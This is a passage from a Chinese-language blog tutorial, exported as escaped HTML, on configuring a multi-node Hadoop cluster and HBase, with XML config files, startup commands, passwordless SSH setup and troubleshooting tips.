class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>dfs.namenode.name.dir<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>file:/home/fenlan/Downloads/hadoop/hdfs/namenode<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>dfs.datanode.data.dir<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>file:/home/fenlan/Downloads/hadoop/hdfs/datanode<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>dfs.namenode.checkpoint.dir<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>file:/home/fenlan/Downloads/hadoop/hdfs/namesecondary<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>dfs.replication<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>dfs.block.size<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>134217728<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>编辑<code>hadoop/etc/hadoop/mapred-site.xml</code>,指定JobTracker的主机名和端口(如果没有，直接复制<code>mapred-site.xml.template</code>)</strong><br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>mapreduce.framework.name<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>yarn<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>mapreduce.jobhistory.address<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>hadoop-master:10020<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>mapreduce.jobhistory.webapp.address<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>hadoop-master:19888<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"comment\">&lt;!--</span><br><span class=\"line\">\t&lt;property&gt;</span><br><span class=\"line\">\t\t&lt;name&gt;yarn.app.mapreduce.am.staging-dir&lt;/name&gt;</span><br><span class=\"line\">\t\t&lt;value&gt;file:/home/fenlan/Downloads/hadoop/app&lt;/value&gt;</span><br><span class=\"line\">\t&lt;/property&gt;</span><br><span class=\"line\">\t--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>编辑<code>hadoop/etc/hadoop/yarn-site.xml</code></strong><br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- Site specific YARN configuration properties --&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>yarn.resourcemanager.hostname<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>hadoop-master<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--</span><br><span class=\"line\">\t&lt;property&gt;</span><br><span class=\"line\">\t\t&lt;name&gt;yarn.resourcemanager.bind-host&lt;/name&gt;</span><br><span class=\"line\">\t\t&lt;value&gt;0.0.0.0&lt;/value&gt;</span><br><span class=\"line\">\t&lt;/property&gt;</span><br><span class=\"line\">\t&lt;property&gt;</span><br><span class=\"line\">\t\t&lt;name&gt;yarn.nodemanager.bind-host&lt;/name&gt;</span><br><span class=\"line\">\t\t&lt;value&gt;0.0.0.0&lt;/value&gt;</span><br><span class=\"line\">\t&lt;/property&gt;</span><br><span class=\"line\">    --&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>yarn.nodemanager.aux-services<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>mapreduce_shuffle<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>yarn.nodemanager.aux-services.mapreduce_shuffle.class<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>org.apache.hadoop.mapred.ShuffleHandler<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>yarn.log-aggregation-enable<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>yarn.nodemanager.local-dirs<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>file:/home/fenlan/Downloads/hadoop/yarn/local<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>yarn.nodemanager.log-dirs<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>file:/home/fenlan/Downloads/hadoop/yarn/log<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"comment\">&lt;!--</span><br><span class=\"line\">\t&lt;property&gt;</span><br><span class=\"line\">\t\t&lt;name&gt;yarn.nodemanager.remote-app-log-dir&lt;/name&gt;</span><br><span class=\"line\">\t\t&lt;value&gt;hdfs://hadoop-master:9000/home/fenlan/Downloads/hadoop/yarn-log/apps&lt;/value&gt;</span><br><span class=\"line\">\t&lt;/property&gt;</span><br><span class=\"line\">\t--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>修改<code>hadoop/etc/hadoop/hadoop-env.sh</code>,将里面的JAVA_HOME设置为JAVA安装根目录</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export HAVA_HOME＝/home/fenlan/Downloads/jdk1.8.0_60</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>想知道本机JAVA_HOME，敲个<code>which java</code>就知道了</p>\n</blockquote>\n<p><strong>编辑<code>hadoop/etc/hadoop/master</code>,添加namenode主机,<code>hadoop/etc/hadoop/slaves</code>,添加datanode主机</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hadoop-master</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hadoop-slave1</span><br><span class=\"line\">hadoop-slave2</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>需要说明，hadoop-slave hadoop-master为主机的hostname, 为了方便管理，需要将主机的hostname修改, 比如我的电脑开始hostname是<code>fenlan-K401UQ</code>, 在我的教程里面就需要改成<code>hadoop-slave1</code>(相当重要，否则在运行程序是会报错找不到主机),这里我个人感激仍然没有讲清楚，下面有一个youtube视频教程，辅助理解</p>\n</blockquote>\n<p><strong>格式化HDFS</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin/hdfs namenode -format</span><br></pre></td></tr></table></figure></p>\n<p><strong>启动Hadoop的单节点集群</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sbin/start-dfs.sh</span><br><span class=\"line\">sbin/start-yarn.sh</span><br><span class=\"line\">sbin/mr-jobhistory-daemon.sh start historyserver</span><br><span class=\"line\">sbin/start-all.sh</span><br></pre></td></tr></table></figure></p>\n<p><strong>停止Hadoop</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sbin/stop-dfs.sh</span><br><span class=\"line\">sbin/stop-yarn.sh</span><br><span class=\"line\">sbin/mr-jobhistory-daemon.sh stop historyserver</span><br><span class=\"line\">sbin/stop-all.sh</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"加载HDFS\"><a href=\"#加载HDFS\" class=\"headerlink\" title=\"加载HDFS\"></a>加载HDFS</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin/hadoop fs -mkdir /fenlan/input</span><br><span class=\"line\">bin/hadoop fs -mkdir /fenlan/output</span><br><span class=\"line\">bin/hadoop fs -put files /fenlan/input</span><br></pre></td></tr></table></figure>\n<p><strong>运行一个单词统计实例</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin/hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-2.8.1.jar wordcount /fenlan/input /fenlan/output/result</span><br></pre></td></tr></table></figure></p>\n<p><strong>查看结果</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin/hadoop fs -cat /fenlan/output/result/*</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"推荐教程\"><a href=\"#推荐教程\" class=\"headerlink\" title=\"推荐教程\"></a>推荐教程</h2><p><a href=\"https://dwbi.org/etl/bigdata/183-setup-hadoop-cluster\" target=\"_blank\" rel=\"external\">hadoop搭建教程</a><br><a href=\"http://www.ityouknow.com/hadoop/2017/07/24/hadoop-cluster-setup.html\" target=\"_blank\" rel=\"external\">hadoop分布式集群搭建</a><br><a href=\"https://www.youtube.com/watch?v=-YEcJquYsFo\" target=\"_blank\" rel=\"external\">视频教程(youtube)</a></p>\n<h2 id=\"HBase-安装\"><a href=\"#HBase-安装\" class=\"headerlink\" title=\"HBase 安装\"></a>HBase 安装</h2><ol>\n<li>官网下载HBase,解压包并重命名为<code>hbase</code></li>\n<li>编辑<code>hbase/conf/hbase-env.sh</code>的<code>JAVA_HOME</code></li>\n<li><p>编辑<code>hbase/conf/hbase-site.xml</code>如下</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>hbase.rootdir<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>hdfs://hadoop-master:9000/hbase<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>hbase.cluster.distributed<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>hbase.master<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>hadoop-master:60000<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>hbase.zookeeper.quorum<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>hadoop-master,hadoop-slave1,hadoop-slave2<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>hbase.master.info.port<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>60010<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>hbase.master.port<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>60000<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>编辑<code>hbase/conf/regionservers</code>添加slaves主机</p>\n</li>\n<li><p>启动HBase(先启动hadoop)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin/start-hbase.sh</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>管理HBase</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin/hbase shell</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"问题总结\"><a href=\"#问题总结\" class=\"headerlink\" title=\"问题总结\"></a>问题总结</h2><p><strong>1.当无法启动datanode时将<code>hadoop/hdfs/datanode/current/</code>文件夹删掉重新启动</strong></p>\n<p><strong>教程如果有错误，欢迎留言!</strong></p>\n","excerpt":"<h2 id=\"hadoop介绍\"><a href=\"#hadoop介绍\" class=\"headerlink\" title=\"hadoop介绍\"></a>hadoop介绍</h2><p><strong>以下是 Hadoop 的几种定义，每种定义都针对的是企业内的不同受众：</strong></p>\n<ul>\n<li>对于高管：Hadoop 是 Apache 的一个开源软件项目，目的是从令人难以置信的数量/速度/多样性等有关组织的数据中获取价值。使用数据，而不是扔掉大部分数据。</li>\n<li>对于技术管理人员：一个开源软件套件，挖掘有关您的企业的结构化和非结构化大数据。Hadoop 集成您现有的商业智能生态系统。</li>\n<li>工程：大规模并行、无共享、基于 Java 的 map-reduce 执行环境。打算使用数百台到数千台计算机处理相同的问题，具有内置的故障恢复能力。Hadoop 生态系统中的项目提供了数据加载、更高层次的语言、自动化的云部署，以及其他功能。</li>\n<li>安全性：由 Kerberos 保护的软件套件。</li>\n</ul>","more":"<h2 id=\"hadoop组件\"><a href=\"#hadoop组件\" class=\"headerlink\" title=\"hadoop组件\"></a>hadoop组件</h2><p><strong>下图显示了Hadoop生态系统各种组件</strong><br><img src=\"http://cdn.guru99.com/images/Big_Data/061114_0803_LearnHadoop4.png\" alt=\"Hadoop\"></p>\n<p><strong>Apache Hadoop 由两个子项目组成</strong></p>\n<ol>\n<li>Hadoop MapReduce : MapReduce 是一种计算模型及软件架构，编写在Hadoop上运行的应用程序。这些MapReduce程序能够对大型集群计算节点并行处理大量的数据。</li>\n<li>HDFS (Hadoop Distributed File System): HDFS 处理 Hadoop 应用程序的存储部分。 MapReduce应用使用来自HDFS的数据。 HDFS创建数据块的多个副本，并集群分发它们到计算节点。这种分配使得应用可靠和极其迅速的计算。</li>\n</ol>\n<p><strong>如果还是不清楚，再解释一下</strong></p>\n<ul>\n<li>HDFS：如果您希望有 4000 多台电脑处理您的数据，那么最好将您的数据分发给 4000 多台电脑。HDFS 可以帮助您做到这一点。HDFS 有几个可以移动的部件。Datanodes 存储数据，Namenode 跟踪存储的位置。还有其他部件，但这些已经足以使您开始了。</li>\n<li>MapReduce：这是一个面向 Hadoop 的编程模型。有两个阶段，毫不意外，它们分别被称为 Map 和 Reduce。如果希望给您的朋友留下深刻的印象，那么告诉他们，Map 和 Reduce 阶段之间有一个随机排序。JobTracker 管理您的 MapReduce 作业的 4000 多个组件。TaskTracker 从 JobTracker 接受订单。如果您喜欢 Java，那么用 Java 编写代码。如果您喜欢 SQL 或 Java 以外的其他语言，您的运气仍然不错，您可以使用一个名为 Hadoop Streaming 的实用程序。</li>\n</ul>\n<p><strong>需要根本性理解这两个东西，否则配置的时候跟着教程走会遇到问题</strong><br><strong>附上<a href=\"https://wizardforcel.gitbooks.io/tutorialspoint-db/hadoop/39.html\">参考地址1</a> <a href=\"https://www.ibm.com/developerworks/cn/data/library/techarticle/dm-1209hadoopbigdata/index.html\">参考地址2</a></strong></p>\n<h2 id=\"说说联机\"><a href=\"#说说联机\" class=\"headerlink\" title=\"说说联机\"></a>说说联机</h2><h3 id=\"首先准备ssh\"><a href=\"#首先准备ssh\" class=\"headerlink\" title=\"首先准备ssh\"></a>首先准备ssh</h3><p><strong>为了使用Hadoop的时候免于密码登录其他Slaves，需要对ssh进行设置。</strong><br><strong>生成登录钥匙,分为公钥和私钥</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure></p>\n<p><strong>一直敲回车(如果之前进行过这种操作，会提示是否覆盖之前的内容，输入y回车)，进行完这一步后系统会在<code>~/.ssh/</code>目录下生成两个文件，一个是私钥，一个是公钥，需要把公钥放在联机主机上</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-copy-id -p port username@remote-server</span><br></pre></td></tr></table></figure></p>\n<p><strong>登录测试一下，通常第一次登录需要密码，之后不需要，如果碰到</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">connect to host localhost port 22: connection refused</span><br></pre></td></tr></table></figure></p>\n<p><strong>有两种可能，一种是你的ssh服务没有打开通过一下命令打开</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo service sshd restart</span><br></pre></td></tr></table></figure></p>\n<p><strong>另一种可能是你的ssh—agent和ssh-server等设置不一致，需要将<code>/etc/ssh/ssh_config</code>和<code>/etc/ssh/sshd_config</code>两个文件里面的端口设置相同</strong></p>\n<p><strong>如果需要这种情况</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sign_and_send_pubkey: signing failed: agent refused operation</span><br></pre></td></tr></table></figure></p>\n<p><strong>需要敲<code>ssh-add</code>就解决问题</strong></p>\n<h3 id=\"联机\"><a href=\"#联机\" class=\"headerlink\" title=\"联机\"></a>联机</h3><p><strong>联机设置主要在<code>hadoop/etc/hadoop/masters</code>和<code>hadoop/etc/hadoop/slaves</code>里面,在所有机子上设置<code>masters</code>为主机ip地址,而只在主机上添加其他所有联机设备的ip地址(2.x版本不需要masters文件，因此不必配置masters文件)</strong></p>\n<blockquote>\n<p>说明：slaves里面同样可以写主机hostname，如果写hostname, 需要配合<code>/etc/hosts</code>一起配置</p>\n</blockquote>\n<p><img src=\"/images/hadoop-master-slaves-conf.png\" alt=\"masters and slaves\"></p>\n<p><strong>然后在主机上启动hadoop,并通过<code>localhost:50070</code>查看Hadoop信息和连接情况</strong></p>\n<p><strong>如果在网页上没有出现我们的datanode，可能是需要进入没有出现的slaves，找到之前<code>hdfs.site.xml</code>配置的目录，将其目录下的所有文件删掉就ok</strong></p>\n<h2 id=\"Hadoop下载安装\"><a href=\"#Hadoop下载安装\" class=\"headerlink\" title=\"Hadoop下载安装\"></a>Hadoop下载安装</h2><h3 id=\"进入Hadoop官网找到最新的稳定版下载\"><a 